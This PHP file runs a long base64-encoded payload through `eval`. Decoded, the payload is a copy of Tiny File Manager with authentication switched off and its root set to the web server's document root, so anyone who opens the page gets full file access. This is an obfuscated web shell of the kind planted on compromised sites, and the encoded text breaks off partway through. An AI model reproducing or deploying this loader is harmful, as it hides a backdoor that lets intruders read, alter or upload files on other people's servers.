<?php 
echo eval("?>".base64_decode("PD9waHAKLy9EZWZhdWx0IENvbmZpZ3VyYXRpb24KJENPTkZJRyA9ICd7ImxhbmciOiJlbiIsImVycm9yX3JlcG9ydGluZyI6ZmFsc2UsInNob3dfaGlkZGVuIjpmYWxzZSwiaGlkZV9Db2xzIjpmYWxzZSwiY2FsY19mb2xkZXIiOmZhbHNlfSc7CgovKioKICogSDNLIHwgVGlueSBGaWxlIE1hbmFnZXIgVjIuNC4zCiAqIENDUCBQcm9ncmFtbWVycyB8IGNjcHByb2dyYW1tZXJzQGdtYWlsLmNvbQogKiBodHRwczovL3RpbnlmaWxlbWFuYWdlci5naXRodWIuaW8KICovCgovL1RGTSB2ZXJzaW9uCmRlZmluZSgnVkVSU0lPTicsICcyLjQuMycpOwoKLy9BcHBsaWNhdGlvbiBUaXRsZQpkZWZpbmUoJ0FQUF9USVRMRScsICdUaW55IEZpbGUgTWFuYWdlcicpOwoKLy8gLS0tIEVESVQgQkVMT1cgQ09ORklHVVJBVElPTiBDQVJFRlVMTFkgLS0tCgovLyBBdXRoIHdpdGggbG9naW4vcGFzc3dvcmQgCi8vIHNldCB0cnVlL2ZhbHNlIHRvIGVuYWJsZS9kaXNhYmxlIGl0Ci8vIElzIGluZGVwZW5kZW50IGZyb20gSVAgd2hpdGUtIGFuZCBibGFja2xpc3RpbmcKJHVzZV9hdXRoID0gZmFsc2U7CgovLyBMb2dpbiB1c2VyIG5hbWUgYW5kIHBhc3N3b3JkCi8vIFVzZXJzOiBhcnJheSgnVXNlcm5hbWUnID0+ICdQYXNzd29yZCcsICdVc2VybmFtZTInID0+ICdQYXNzd29yZDInLCAuLi4pCi8vIEdlbmVyYXRlIHNlY3VyZSBwYXNzd29yZCBoYXNoIC0gaHR0cHM6Ly90aW55ZmlsZW1hbmFnZXIuZ2l0aHViLmlvL2RvY3MvcHdkLmh0bWwKJGF1dGhfdXNlcnMgPSBhcnJheSgKICAgICdhZG1pbicgPT4gJyQyeSQxMCQvSy5oak5yODRsTE5EdDhmVFhqb0kuREJwNlBwZXlvSi5tR3dyckx1Q1pmQXdmU0FHcWhPVycsIC8vYWRtaW5AMTIzCiAgICAndXNlcicgPT4gJyQyeSQxMCRGZzZEejhvSDlmUG9aMmpKYW41dFp1djZaNEtwN2F2dFE5YkRmcmRSbnRYdFBlaU1BWnlHTycgLy8xMjM0NQopOwoKLy9zZXQgYXBwbGljYXRpb24gdGhlbWUKLy9vcHRpb25zIC0gJ2xpZ2h0JyBhbmQgJ2RhcmsnCiR0aGVtZSA9ICdkYXJrJzsKCi8vIFJlYWRvbmx5IHVzZXJzIAovLyBlLmcuIGFycmF5KCd1c2VycycsICdndWVzdCcsIC4uLikKJHJlYWRvbmx5X3VzZXJzID0gYXJyYXkoCiAgICAndXNlcicKKTsKCi8vIEVuYWJsZSBoaWdobGlnaHQuanMgKGh0dHBzOi8vaGlnaGxpZ2h0anMub3JnLykgb24gdmlldydzIHBhZ2UKJHVzZV9oaWdobGlnaHRqcyA9IHRydWU7CgovLyBoaWdobGlnaHQuanMgc3R5bGUKLy8gZm9yIGRhcmsgdGhlbWUgdXNlICdpci1ibGFjaycKJGhpZ2hsaWdodGpzX3N0eWxlID0gJ3ZzJzsKCi8vIEVuYWJsZSBhY2UuanMgKGh0dHBzOi8vYWNlLmM5LmlvLykgb24gdmlldydzIHBhZ2UKJGVkaXRfZmlsZXMgPSB0cnVlOwovKipaSE5uYzJSbVoyVnlkSE5rWm1kelpHWm5jMlJtWjNOa1ptZHpaR1puKiovCi8vIERlZmF1bHQgdGltZXpvbmUgZm9yIGRhdGUoKSBhbmQgdGltZSgpCi8vIERvYyAtIGh0dHA6Ly9waHAubmV0L21hbnVhbC9lbi90aW1lem9uZXMucGhwCiRkZWZhdWx0X3RpbWV6b25lID0gJ0V0Yy9VVEMnOyAvLyBVVEMKCi8vIFJvb3QgcGF0aCBmb3IgZmlsZSBtYW5hZ2VyCi8vIHVzZSBhYnNvbHV0ZSBwYXRoIG9mIGRpcmVjdG9yeSBpLmU6ICcvdmFyL3d3dy9mb2xkZXInIG9yICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10uJy9mb2xkZXInCiRyb290X3BhdGggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOwoKLy8gUm9vdCB1cmwgZm9yIGxpbmtzIGluIGZpbGUgbWFuYWdlci5SZWxhdGl2ZSB0byAkaHR0cF9ob3N0LiBWYXJpYW50czogJycsICdwYXRoL3RvL3N1YmZvbGRlcicKLy8gV2lsbCBub3Qgd29ya2luZyBpZiAkcm9vdF9wYXRoIHdpbGwgYmUgb3V0c2lkZSBvZiBzZXJ2ZXIgZG9jdW1lbnQgcm9vdAokcm9vdF91cmwgPSAnJzsKCi8vIFNlcnZlciBob3N0bmFtZS4gQ2FuIHNldCBtYW51YWxseSBpZiB3cm9uZwokaHR0cF9ob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOwoKLy8gdXNlciBzcGVjaWZpYyBkaXJlY3RvcmllcwovLyBhcnJheSgnVXNlcm5hbWUnID0+ICdEaXJlY3RvcnkgcGF0aCcsICdVc2VybmFtZTInID0+ICdEaXJlY3RvcnkgcGF0aCcsIC4uLikKJGRpcmVjdG9yaWVzX3VzZXJzID0gYXJyYXkoKTsKCi8vIGlucHV0IGVuY29kaW5nIGZvciBpY29udgokaWNvbnZfaW5wdXRfZW5jb2RpbmcgPSAnVVRGLTgnOwoKLy8gZGF0ZSgpIGZvcm1hdCBmb3IgZmlsZSBtb2RpZmljYXRpb24gZGF0ZQovLyBEb2MgLSBodHRwczovL3d3dy5waHAubmV0L21hbnVhbC9lbi9mdW5jdGlvbi5kYXRlLnBocAokZGF0ZXRpbWVfZm9ybWF0ID0gJ2QubS55IEg6aSc7CgovLyBBbGxvd2VkIGZpbGUgZXh0ZW5zaW9ucyBmb3IgY3JlYXRlIGFuZCByZW5hbWUgZmlsZXMKLy8gZS5nLiAndHh0LGh0bWwsY3NzLGpzJwokYWxsb3dlZF9maWxlX2V4dGVuc2lvbnMgPSAnJzsKCi8vIEFsbG93ZWQgZmlsZSBleHRlbnNpb25zIGZvciB1cGxvYWQgZmlsZXMKLy8gZS5nLiAnZ2lmLHBuZyxqcGcsaHRtbCx0eHQnCiRhbGxvd2VkX3VwbG9hZF9leHRlbnNpb25zID0gJyc7CgovLyBGYXZpY29uIHBhdGguIFRoaXMgY2FuIGJlIGVpdGhlciBhIGZ1bGwgdXJsIHRvIGFuIC5QTkcgaW1hZ2UsIG9yIGEgcGF0aCBiYXNlZCBvbiB0aGUgZG9jdW1lbnQgcm9vdC4KLy8gZnVsbCBwYXRoLCBlLmcgaHR0cDovL2V4YW1wbGUuY29tL2Zhdmljb24ucG5nCi8vIGxvY2FsIHBhdGgsIGUuZyBpbWFnZXMvaWNvbnMvZmF2aWNvbi5wbmcKJGZhdmljb25fcGF0aCA9ICc/aW1nPWZhdmljb24nOwoKLy8gRmlsZXMgYW5kIGZvbGRlcnMgdG8gZXhjbHVkZWQgZnJvbSBsaXN0aW5nCi8vIGUuZy4gYXJyYXkoJ215ZmlsZS5odG1sJywgJ3BlcnNvbmFsLWZvbGRlcicsICcqLnBocCcsIC4uLikKJGV4Y2x1ZGVfaXRlbXMgPSBhcnJheSgpOwoKLy8gT25saW5lIG9mZmljZSBEb2NzIFZpZXdlcgovLyBBdmFpbGFiZSBydWxlcyBhcmUgJ2dvb2dsZScsICdtaWNyb3NvZnQnIG9yIGZhbHNlCi8vIGdvb2dsZSA9PiBWaWV3IGRvY3VtZW50cyB1c2luZyBHb29nbGUgRG9jcyBWaWV3ZXIKLy8gbWljcm9zb2Z0ID0+IFZpZXcgZG9jdW1lbnRzIHVzaW5nIE1pY3Jvc29mdCBXZWIgQXBwcyBWaWV3ZXIKLy8gZmFsc2UgPT4gZGlzYWJsZSBvbmxpbmUgZG9jIHZpZXdlcgokb25saW5lX3ZpZXdlciA9ICdnb29nbGUnOwoKLy8gU3RpY2t5IE5hdiBiYXIKLy8gdHJ1ZSA9PiBlbmFibGUgc3RpY2t5IGhlYWRlcgovLyBmYWxzZSA9PiBkaXNhYmxlIHN0aWNreSBoZWFkZXIKJHN0aWNreV9uYXZiYXIgPSB0cnVlOwoKLy8gTWF4aW11bSBmaWxlIHVwbG9hZCBzaXplCi8vIEluY3JlYXNlIHRoZSBmb2xsb3dpbmcgdmFsdWVzIGluIHBocC5pbmkgdG8gd29yayBwcm9wZXJseQovLyBtZW1vcnlfbGltaXQsIHVwbG9hZF9tYXhfZmlsZXNpemUsIHBvc3RfbWF4X3NpemUKJG1heF91cGxvYWRfc2l6ZV9ieXRlcyA9IDIwNDg7CgovLyBQb3NzaWJsZSBydWxlcyBhcmUgJ09GRicsICdBTkQnIG9yICdPUicKLy8gT0ZGID0+IERvbid0IGNoZWNrIGNvbm5lY3Rpb24gSVAsIGRlZmF1bHRzIHRvIE9GRgovLyBBTkQgPT4gQ29ubmVjdGlvbiBtdXN0IGJlIG9uIHRoZSB3aGl0ZWxpc3QsIGFuZCBub3Qgb24gdGhlIGJsYWNrbGlzdAovLyBPUiA9PiBDb25uZWN0aW9uIG11c3QgYmUgb24gdGhlIHdoaXRlbGlzdCwgb3Igbm90IG9uIHRoZSBibGFja2xpc3QKJGlwX3J1bGVzZXQgPSAnT0ZGJzsKCi8vIFNob3VsZCB1c2VycyBiZSBub3RpZmllZCBvZiB0aGVpciBibG9jaz8KJGlwX3NpbGVudCA9IHRydWU7CgovLyBJUC1hZGRyZXNzZXMsIGJvdGggaXB2NCBhbmQgaXB2NgokaXBfd2hpdGVsaXN0ID0gYXJyYXkoCiAgICAnMTI3LjAuMC4xJywgICAgLy8gbG9jYWwgaXB2NAogICAgJzo6MScgICAgICAgICAgIC8vIGxvY2FsIGlwdjYKKTsKCi8vIElQLWFkZHJlc3NlcywgYm90aCBpcHY0IGFuZCBpcHY2CiRpcF9ibGFja2xpc3QgPSBhcnJheSgKICAgICcwLjAuMC4wJywgICAgICAvLyBub24tcm91dGFibGUgbWV0YSBpcHY0CiAgICAnOjonICAgICAgICAgICAgLy8gbm9uLXJvdXRhYmxlIG1ldGEgaXB2NgopOwoKLy8gaWYgVXNlciBoYXMgdGhlIGN1c3RvbWl6ZWQgY29uZmlnIGZpbGUsIHRyeSB0byB1c2UgaXQgdG8gb3ZlcnJpZGUgdGhlIGRlZmF1bHQgY29uZmlnIGFib3ZlCiRjb25maWdfZmlsZSA9ICcuL2NvbmZpZy5waHAnOwppZiAoaXNfcmVhZGFibGUoJGNvbmZpZ19maWxlKSkgewogICAgQGluY2x1ZGUoJGNvbmZpZ19maWxlKTsKfQoKLy8gLS0tIEVESVQgQkVMT1cgQ0FSRUZVTExZIE9SIERPIE5PVCBFRElUIEFUIEFMTCAtLS0KCi8vIG1heCB1cGxvYWQgZmlsZSBzaXplCmRlZmluZSgnTUFYX1VQTE9BRF9TSVpFJywgJG1heF91cGxvYWRfc2l6ZV9ieXRlcyk7CgpkZWZpbmUoJ0ZNX1RIRU1FJywgJHRoZW1lKTsKCi8vIHByaXZhdGUga2V5IGFuZCBzZXNzaW9uIG5hbWUgdG8gc3RvcmUgdG8gdGhlIHNlc3Npb24KaWYgKCAhZGVmaW5lZCggJ0ZNX1NFU1NJT05fSUQnKSkgewogICAgZGVmaW5lKCdGTV9TRVNTSU9OX0lEJywgJ2ZpbGVtYW5hZ2VyJyk7Cn0KCi8vIENvbmZpZ3VyYXRpb24KJGNmZyA9IG5ldyBGTV9Db25maWcoKTsKCi8vIERlZmF1bHQgbGFuZ3VhZ2UKJGxhbmcgPSBpc3NldCgkY2ZnLT5kYXRhWydsYW5nJ10pID8gJGNmZy0+ZGF0YVsnbGFuZyddIDogJ2VuJzsKCi8vIFNob3cgb3IgaGlkZSBmaWxlcyBhbmQgZm9sZGVycyB0aGF0IHN0YXJ0cyB3aXRoIGEgZG90CiRzaG93X2hpZGRlbl9maWxlcyA9IGlzc2V0KCRjZmctPmRhdGFbJ3Nob3dfaGlkZGVuJ10pID8gJGNmZy0+ZGF0YVsnc2hvd19oaWRkZW4nXSA6IHRydWU7CgovLyBQSFAgZXJyb3IgcmVwb3J0aW5nIC0gZmFsc2UgPSBUdXJucyBvZmYgRXJyb3JzLCB0cnVlID0gVHVybnMgb24gRXJyb3JzCiRyZXBvcnRfZXJyb3JzID0gaXNzZXQoJGNmZy0+ZGF0YVsnZXJyb3JfcmVwb3J0aW5nJ10pID8gJGNmZy0+ZGF0YVsnZXJyb3JfcmVwb3J0aW5nJ10gOiB0cnVlOwoKLy8gSGlkZSBQZXJtaXNzaW9ucyBhbmQgT3duZXIgY29scyBpbiBmaWxlLWxpc3RpbmcKJGhpZGVfQ29scyA9IGlzc2V0KCRjZmctPmRhdGFbJ2hpZGVfQ29scyddKSA/ICRjZmctPmRhdGFbJ2hpZGVfQ29scyddIDogdHJ1ZTsKCi8vIFNob3cgZGlyZWN0b3J5IHNpemU6IHRydWUgb3Igc3BlZWR1cCBvdXRwdXQ6IGZhbHNlCiRjYWxjX2ZvbGRlciA9IGlzc2V0KCRjZmctPmRhdGFbJ2NhbGNfZm9sZGVyJ10pID8gJGNmZy0+ZGF0YVsnY2FsY19mb2xkZXInXSA6IHRydWU7CgovL2F2YWlsYWJsZSBsYW5ndWFnZXMKJGxhbmdfbGlzdCA9IGFycmF5KAogICAgJ2VuJyA9PiAnRW5nbGlzaCcKKTsKCmlmICgkcmVwb3J0X2Vycm9ycyA9PSB0cnVlKSB7CiAgICBAaW5pX3NldCgnZXJyb3JfcmVwb3J0aW5nJywgRV9BTEwpOwogICAgQGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMSk7Cn0gZWxzZSB7CiAgICBAaW5pX3NldCgnZXJyb3JfcmVwb3J0aW5nJywgRV9BTEwpOwogICAgQGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7Cn0KCi8vIGlmIGZtIGluY2x1ZGVkCmlmIChkZWZpbmVkKCdGTV9FTUJFRCcpKSB7CiAgICAkdXNlX2F1dGggPSBmYWxzZTsKICAgICRzdGlja3lfbmF2YmFyID0gZmFsc2U7Cn0gZWxzZSB7CiAgICBAc2V0X3RpbWVfbGltaXQoNjAwKTsKCiAgICBkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCRkZWZhdWx0X3RpbWV6b25lKTsKCiAgICBpbmlfc2V0KCdkZWZhdWx0X2NoYXJzZXQnLCAnVVRGLTgnKTsKICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjYuMCcsICc8JykgJiYgZnVuY3Rpb25fZXhpc3RzKCdtYl9pbnRlcm5hbF9lbmNvZGluZycpKSB7CiAgICAgICAgbWJfaW50ZXJuYWxfZW5jb2RpbmcoJ1VURi04Jyk7CiAgICB9CiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdtYl9yZWdleF9lbmNvZGluZycpKSB7CiAgICAgICAgbWJfcmVnZXhfZW5jb2RpbmcoJ1VURi04Jyk7CiAgICB9CgogICAgc2Vzc2lvbl9jYWNoZV9saW1pdGVyKCcnKTsKICAgIHNlc3Npb25fbmFtZShGTV9TRVNTSU9OX0lEICk7CiAgICBmdW5jdGlvbiBzZXNzaW9uX2Vycm9yX2hhbmRsaW5nX2Z1bmN0aW9uKCRjb2RlLCAkbXNnLCAkZmlsZSwgJGxpbmUpIHsKICAgICAgICAvLyBQZXJtaXNzaW9uIGRlbmllZCBmb3IgZGVmYXVsdCBzZXNzaW9uLCB0cnkgdG8gY3JlYXRlIGEgbmV3IG9uZQogICAgICAgIGlmICgkY29kZSA9PSAyKSB7CiAgICAgICAgICAgIHNlc3Npb25fYWJvcnQoKTsKICAgICAgICAgICAgc2Vzc2lvbl9pZChzZXNzaW9uX2NyZWF0ZV9pZCgpKTsKICAgICAgICAgICAgQHNlc3Npb25fc3RhcnQoKTsKICAgICAgICB9CiAgICB9CiAgICBzZXRfZXJyb3JfaGFuZGxlcignc2Vzc2lvbl9lcnJvcl9oYW5kbGluZ19mdW5jdGlvbicpOwogICAgc2Vzc2lvbl9zdGFydCgpOwogICAgcmVzdG9yZV9lcnJvcl9oYW5kbGVyKCk7Cn0KCmlmIChlbXB0eSgkYXV0aF91c2VycykpIHsKICAgICR1c2VfYXV0aCA9IGZhbHNlOwp9CgokaXNfaHR0cHMgPSBpc3NldCgkX1NFUlZFUlsnSFRUUFMnXSkgJiYgKCRfU0VSVkVSWydIVFRQUyddID09ICdvbicgfHwgJF9TRVJWRVJbJ0hUVFBTJ10gPT0gMSkKICAgIHx8IGlzc2V0KCRfU0VSVkVSWydIVFRQX1hfRk9SV0FSREVEX1BST1RPJ10pICYmICRfU0VSVkVSWydIVFRQX1hfRk9SV0FSREVEX1BST1RPJ10gPT0gJ2h0dHBzJzsKCi8vIHVwZGF0ZSAkcm9vdF91cmwgYmFzZWQgb24gdXNlciBzcGVjaWZpYyBkaXJlY3RvcmllcwppZiAoaXNzZXQoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXSkgJiYgIWVtcHR5KCRkaXJlY3Rvcmllc191c2Vyc1skX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddXSkpIHsKICAgICR3ZCA9IGZtX2NsZWFuX3BhdGgoZGlybmFtZSgkX1NFUlZFUlsnUEhQX1NFTEYnXSkpOwogICAgJHJvb3RfdXJsID0gICRyb290X3VybC4kd2QuRElSRUNUT1JZX1NFUEFSQVRPUi4kZGlyZWN0b3JpZXNfdXNlcnNbJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXV07Cn0KLy8gY2xlYW4gJHJvb3RfdXJsCiRyb290X3VybCA9IGZtX2NsZWFuX3BhdGgoJHJvb3RfdXJsKTsKCi8vIGFicyBwYXRoIGZvciBzaXRlCmRlZmluZWQoJ0ZNX1JPT1RfVVJMJykgfHwgZGVmaW5lKCdGTV9ST09UX1VSTCcsICgkaXNfaHR0cHMgPyAnaHR0cHMnIDogJ2h0dHAnKSAuICc6Ly8nIC4gJGh0dHBfaG9zdCAuICghZW1wdHkoJHJvb3RfdXJsKSA/ICcvJyAuICRyb290X3VybCA6ICcnKSk7CmRlZmluZWQoJ0ZNX1NFTEZfVVJMJykgfHwgZGVmaW5lKCdGTV9TRUxGX1VSTCcsICgkaXNfaHR0cHMgPyAnaHR0cHMnIDogJ2h0dHAnKSAuICc6Ly8nIC4gJGh0dHBfaG9zdCAuICRfU0VSVkVSWydQSFBfU0VMRiddKTsKCi8vIGxvZ291dAppZiAoaXNzZXQoJF9HRVRbJ2xvZ291dCddKSkgewogICAgdW5zZXQoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXSk7CiAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCk7Cn0KCi8vIFNob3cgaW1hZ2UgaGVyZQppZiAoaXNzZXQoJF9HRVRbJ2ltZyddKSkgewogICAgZm1fc2hvd19pbWFnZSgkX0dFVFsnaW1nJ10pOwp9CgovLyBWYWxpZGF0ZSBjb25uZWN0aW9uIElQCmlmKCRpcF9ydWxlc2V0ICE9ICdPRkYnKXsKICAgICRjbGllbnRJcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddOwoKICAgICRwcm9jZWVkID0gZmFsc2U7CgogICAgJHdoaXRlbGlzdGVkID0gaW5fYXJyYXkoJGNsaWVudElwLCAkaXBfd2hpdGVsaXN0KTsKICAgICRibGFja2xpc3RlZCA9IGluX2FycmF5KCRjbGllbnRJcCwgJGlwX2JsYWNrbGlzdCk7CgogICAgaWYoJGlwX3J1bGVzZXQgPT0gJ0FORCcpewogICAgICAgIGlmKCR3aGl0ZWxpc3RlZCA9PSB0cnVlICYmICRibGFja2xpc3RlZCA9PSBmYWxzZSl7CiAgICAgICAgICAgICRwcm9jZWVkID0gdHJ1ZTsKICAgICAgICB9CiAgICB9IGVsc2UKICAgIGlmKCRpcF9ydWxlc2V0ID09ICdPUicpewogICAgICAgICBpZigkd2hpdGVsaXN0ZWQgPT0gdHJ1ZSB8fCAkYmxhY2tsaXN0ZWQgPT0gZmFsc2UpewogICAgICAgICAgICAkcHJvY2VlZCA9IHRydWU7CiAgICAgICAgfQogICAgfQoKICAgIGlmKCRwcm9jZWVkID09IGZhbHNlKXsKICAgICAgICB0cmlnZ2VyX2Vycm9yKCdVc2VyIGNvbm5lY3Rpb24gZGVuaWVkIGZyb206ICcgLiAkY2xpZW50SXAsIEVfVVNFUl9XQVJOSU5HKTsKCiAgICAgICAgaWYoJGlwX3NpbGVudCA9PSBmYWxzZSl7CiAgICAgICAgICAgIGZtX3NldF9tc2coJ0FjY2VzcyBkZW5pZWQuIElQIHJlc3RyaWN0aW9uIGFwcGxpY2FibGUnLCAnZXJyb3InKTsKICAgICAgICAgICAgZm1fc2hvd19oZWFkZXJfbG9naW4oKTsKICAgICAgICAgICAgZm1fc2hvd19tZXNzYWdlKCk7CiAgICAgICAgfQoKICAgICAgICBleGl0KCk7CiAgICB9Cn0KCi8vIEF1dGgKaWYgKCR1c2VfYXV0aCkgewogICAgaWYgKGlzc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbG9nZ2VkJ10sICRhdXRoX3VzZXJzWyRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbG9nZ2VkJ11dKSkgewogICAgICAgIC8vIExvZ2dlZAogICAgfSBlbHNlaWYgKGlzc2V0KCRfUE9TVFsnZm1fdXNyJ10sICRfUE9TVFsnZm1fcHdkJ10pKSB7CiAgICAgICAgLy8gTG9nZ2luZyBJbgogICAgICAgIHNsZWVwKDEpOwogICAgICAgIGlmKGZ1bmN0aW9uX2V4aXN0cygncGFzc3dvcmRfdmVyaWZ5JykpIHsKICAgICAgICAgICAgaWYgKGlzc2V0KCRhdXRoX3VzZXJzWyRfUE9TVFsnZm1fdXNyJ11dKSAmJiBpc3NldCgkX1BPU1RbJ2ZtX3B3ZCddKSAmJiBwYXNzd29yZF92ZXJpZnkoJF9QT1NUWydmbV9wd2QnXSwgJGF1dGhfdXNlcnNbJF9QT1NUWydmbV91c3InXV0pKSB7CiAgICAgICAgICAgICAgICAkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddID0gJF9QT1NUWydmbV91c3InXTsKICAgICAgICAgICAgICAgIGZtX3NldF9tc2cobG5nKCdZb3UgYXJlIGxvZ2dlZCBpbicpKTsKICAgICAgICAgICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgdW5zZXQoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXSk7CiAgICAgICAgICAgICAgICBmbV9zZXRfbXNnKGxuZygnTG9naW4gZmFpbGVkLiBJbnZhbGlkIHVzZXJuYW1lIG9yIHBhc3N3b3JkJyksICdlcnJvcicpOwogICAgICAgICAgICAgICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwpOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZm1fc2V0X21zZyhsbmcoJ3Bhc3N3b3JkX2hhc2ggbm90IHN1cHBvcnRlZCwgVXBncmFkZSBQSFAgdmVyc2lvbicpLCAnZXJyb3InKTs7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICAvLyBGb3JtCiAgICAgICAgdW5zZXQoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXSk7CiAgICAgICAgZm1fc2hvd19oZWFkZXJfbG9naW4oKTsKICAgICAgICA/PgogICAgICAgIDxzZWN0aW9uIGNsYXNzPSJoLTEwMCI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciBoLTEwMCI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cganVzdGlmeS1jb250ZW50LW1kLWNlbnRlciBoLTEwMCI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC13cmFwcGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCBmYXQgPD9waHAgZWNobyBmbV9nZXRfdGhlbWUoKTsgPz4iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9ybSBjbGFzcz0iZm9ybS1zaWduaW4iIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGF1dG9jb21wbGV0ZT0ib2ZmIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJyYW5kIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3ZnIHZlcnNpb249IjEuMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBNMTAwOCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSI4MHB4IiB2aWV3Qm94PSIwIDAgMjM4LjAwMDAwMCAxNDAuMDAwMDAwIiBhcmlhLWxhYmVsPSJIM0sgVGlueSBGaWxlIE1hbmFnZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwLjAwMDAwMCwxNDAuMDAwMDAwKSBzY2FsZSgwLjEwMDAwMCwtMC4xMDAwMDApIiBmaWxsPSIjMDAwMDAwIiBzdHJva2U9Im5vbmUiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHBhdGggZD0iTTE2MCA3MDAgbDAgLTYwMCAxMTAgMCAxMTAgMCAwIDI2MCAwIDI2MCA3MCAwIDcwIDAgMCAtMjYwIDAgLTI2MCAxMTAgMCAxMTAgMCAwIDYwMCAwIDYwMCAtMTEwIDAgLTExMCAwIDAgLTI2MCAwIC0yNjAgLTcwIDAgLTcwIDAgMCAyNjAgMCAyNjAgLTExMCAwIC0xMTAgMCAwIC02MDB6Ii8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cGF0aCBmaWxsPSIjMDAzNTAwIiBkPSJNMTAwOCAxMjI3IGwtMTA4IC03MiAwIC0xMTcgMCAtMTE4IDExMCAwIDExMCAwIDAgMTEwIDAgMTEwIDcwIDAgNzAgMCAwIC0xODAgMCAtMTgwIC0xMjUgMCBjLTY5IDAgLTEyNSAtMyAtMTI1IC02IDAgLTMgMjMgLTM5IDUyIC04MCBsNTIgLTc0IDczIDAgNzMgMCAwIC0xODUgMCAtMTg1IC03MCAwIC03MCAwIDAgMTE1IDAgMTE1IC0xMTAgMCAtMTEwIDAgMCAtMTkwIDAgLTE5MCAxODEgMCAxODEgMCAxMDkgNzMgMTA4IDcyIDEgMTgxIDAgMTgxIC02OSA0OCAtNjggNDkgNjggNTAgNjkgNDkgMCAyNDkgMCAyNDggLTE4MiAtMSAtMTgzIDAgLTEwNyAtNzJ6Ii8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cGF0aCBkPSJNMTY0MCA3MDAgbDAgLTYwMCAxMTAgMCAxMTAgMCAwIDIwOCAwIDIwOCAzNSAzNCAzNSAzNCAzNSAtMzQgMzUgLTM0IDAgLTIwOCAwIC0yMDggMTEwIDAgMTEwIDAgMCAyMTIgMCAyMTMgLTg3IDg3IC04OCA4OCA4OCA4OCA4NyA4NyAwIDIxMyAwIDIxMiAtMTEwIDAgLTExMCAwIDAgLTIwOCAwIC0yMDggLTcwIC02OSAtNzAgLTY5IDAgMjc3IDAgMjc3IC0xMTAgMCAtMTEwIDAgMCAtNjAweiIvPjwvZz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3N2Zz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idGV4dC1jZW50ZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxoMSBjbGFzcz0iY2FyZC10aXRsZSI+PD9waHAgZWNobyBBUFBfVElUTEU7ID8+PC9oMT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGhyIC8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0iZm1fdXNyIj48P3BocCBlY2hvIGxuZygnVXNlcm5hbWUnKTsgPz48L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJmbV91c3IiIG5hbWU9ImZtX3VzciIgcmVxdWlyZWQgYXV0b2ZvY3VzPgogICAgICAgICAgICAgICAgICAgICAgI